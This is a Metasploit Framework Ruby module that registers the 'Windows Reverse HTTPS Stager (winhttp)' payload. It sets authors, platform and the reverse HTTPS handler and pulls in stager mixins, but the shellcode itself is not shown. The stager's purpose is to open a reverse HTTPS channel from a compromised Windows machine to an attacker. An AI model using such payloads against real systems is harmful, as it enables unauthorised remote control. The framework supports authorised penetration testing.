##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/windows/reverse_winhttps'

module Metasploit4

  CachedSize = 377

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseWinHttps

  def self.handler_type_alias
    "reverse_winhttps"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Reverse HTTPS Stager (winhttp)',
      'Description' => 'Tunnel communication over HTTPS (Windows winhttp)',
      'Author'      => [ 'hdm', 'Borja Merino <bmerinofe[at]gmail.com>' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'sockedi https'))
  end

end
